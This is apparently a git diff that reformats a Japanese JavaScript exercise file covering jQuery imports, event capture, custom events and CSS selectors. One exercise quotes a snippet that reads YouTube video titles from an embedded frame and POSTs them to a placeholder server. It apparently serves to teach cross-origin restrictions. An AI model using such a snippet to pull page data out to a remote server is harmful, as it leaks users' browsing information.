@@ -58,10 +58,8 @@
 またその動作確認方法を文書で記述しなさい。
 
 ```js
-const { $ } = await import(
-  "https://releases.jquery.com/git/jquery-git.module.min.js"
-);
-$("*").css("color", "red");
+const { $ } = await import('https://releases.jquery.com/git/jquery-git.module.min.js');
+$('*').css('color', 'red');
 ```
 
 **出題範囲 15.1.1.4**
@@ -116,11 +114,9 @@ navigator から取得できる要素をページ中に描画して詐欺サイ�
 ```js
 async () => {
   // YouTube が利用者に推薦する動画タイトルを取得すれば、利用者に最適な商品セットを表示できるのではないか？
-  const titles = document
-    .getElementById("other")
-    .contentWindowquerySelectorAll("#video-title");
+  const titles = document.getElementById('other').contentWindowquerySelectorAll('#video-title');
   for (const t of titles) {
-    await fetch("your-server-path", { method: "POST", body: t.textContent });
+    await fetch('your-server-path', { method: 'POST', body: t.textContent });
   }
 };
 ```
@@ -172,17 +168,17 @@ div 要素とテキスト input 要素が以下のようにイベント処理さ
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>EVENT propagation, dispatch</title>
     <script type="module">
-      const div = document.querySelector("#div");
-      const btn = document.querySelector("#btn");
+      const div = document.querySelector('#div');
+      const btn = document.querySelector('#btn');
       div.addEventListener(
-        "click",
+        'click',
         () => {
-          console.log("div");
+          console.log('div');
         },
-        { capture: true }
+        { capture: true },
       );
-      btn.addEventListener("click", () => {
-        console.log("button");
+      btn.addEventListener('click', () => {
+        console.log('button');
       });
 
       class RandomEventTarget extends EventTarget {
@@ -191,7 +187,7 @@ div 要素とテキスト input 要素が以下のようにイベント処理さ
         }
 
         trigger() {
-          const randomNumber = new CustomEvent("random", {
+          const randomNumber = new CustomEvent('random', {
             detail: Math.random(),
           });
           this.dispatchEvent(randomNumber);
@@ -202,7 +198,7 @@ div 要素とテキスト input 要素が以下のようにイベント処理さ
 
       // 1. htmlのpタグ要素を生成しなさい。また、ボタン要素の直後の位置にpタグ要素を配置しなさい。
 
-      randomEventTarget.addEventListener("random", (e) => {
+      randomEventTarget.addEventListener('random', (e) => {
         // 2. 生成済みのpタグ要素のテキストに、イベントの保持する乱数値を代入しなさい。
       });
 
@@ -268,15 +264,13 @@ index.html に対して以下の要素を CSS セレクタで指定して consol
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Product List</title>
     <script type="module">
-      document
-        .getElementById("category-select")
-        .addEventListener("change", (e) => {
-          const selectedCategory = e.target.value;
-          const products = document.querySelectorAll("#productList li");
-          products.forEach((product) => {
-            // ここにコードを書いて完成させる
-          });
+      document.getElementById('category-select').addEventListener('change', (e) => {
+        const selectedCategory = e.target.value;
+        const products = document.querySelectorAll('#productList li');
+        products.forEach((product) => {
+          // ここにコードを書いて完成させる
         });
+      });
     </script>
   </head>
   <body>
@@ -287,12 +281,8 @@ index.html に対して以下の要素を CSS セレクタで指定して consol
     </select>
     <ul id="productList">
       <li data-testid="food1" data-category="food">お菓子 - ¥1000</li>
-      <li data-testid="stationery1" data-category="stationery">
-        消しゴム - ¥200
-      </li>
-      <li data-testid="stationery2" data-category="stationery">
-        ものさし - ¥300
-      </li>
+      <li data-testid="stationery1" data-category="stationery">消しゴム - ¥200</li>
+      <li data-testid="stationery2" data-category="stationery">ものさし - ¥300</li>
     </ul>
   </body>
 </html>
